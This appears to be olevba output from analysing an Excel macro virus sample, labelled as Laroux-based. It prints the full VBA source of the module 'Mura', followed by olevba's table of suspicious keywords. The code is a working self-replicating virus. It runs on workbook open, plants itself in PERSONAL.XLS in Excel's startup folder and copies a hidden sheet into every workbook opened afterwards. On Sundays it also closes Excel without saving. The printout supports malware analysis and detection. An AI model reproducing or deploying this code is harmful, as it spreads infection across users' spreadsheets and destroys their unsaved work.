olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-928095e5aceeb8f8aeefda09767174a9b1bfe5ee
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Mura.bas 
in file: Virus.MSExcel.Laroux-based-928095e5aceeb8f8aeefda09767174a9b1bfe5ee - OLE stream: '_VBA_PROJECT_CUR/VBA/Mura'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Type SYSTEMTIME
        wYear As Integer
        wMonth As Integer
        wDayOfWeek As Integer
        wDay As Integer
        wHour As Integer
        wMinute As Integer
        wSecond As Integer
        wMilliseconds As Integer
End Type
Private st   As SYSTEMTIME
Private Declare Sub GetSystemTime Lib "kernel32" (lpSystemTime As SYSTEMTIME)


Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "Sattle"
End Sub

Sub Sattle()
Attribute Sattle.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    Select Case whichfile
        Case 10
        Application.ScreenUpdating = False
        n4$ = ActiveWorkbook.Name
        Sheets("Mura").Visible = True
        Sheets("Mura").Select
        Sheets("Mura").Copy
        With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
        End With
        newname$ = ActiveWorkbook.Name
        c4$ = CurDir()
        ChDir Application.StartupPath
        ActiveWindow.Visible = False
        If sv = 0 Then
        Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
        Else
        Workbooks("PERSONAL.XLS").Save
        End If
        ChDir c4$
        Workbooks(n4$).Sheets("Mura").Visible = False
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "personal.xls!Sattle"
        Case 1
        Application.ScreenUpdating = False
        n4$ = ActiveWorkbook.Name
        p4$ = ActiveWorkbook.Path
        s$ = Workbooks(n4$).Sheets(1).Name
        If s$ <> "Mura" Then
            Workbooks("PERSONAL.XLS").Sheets("Mura").Copy before:=Workbooks(n4$).Sheets(1)
            Workbooks(n4$).Sheets("Mura").Visible = False
        Else
        End If
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "personal.xls!Sattle"
        Case Else
            GetSystemTime st
            Select Case st.wDayOfWeek
                Case 6
                    MsgBox "今日は土曜日です" & Chr(&HD) & "仕事なんか休みましょう！", vbOKOnly + vbCritical
                Case 7
                    MsgBox "今日は日曜日です" & Chr(&HD) & "仕事なんかすぐにやめて外に遊びに行きましょう！", vbOKOnly + vbCritical
                    Application.DisplayAlerts = False
                    Application.Quit
            End Select
    End Select
    End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Mur
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

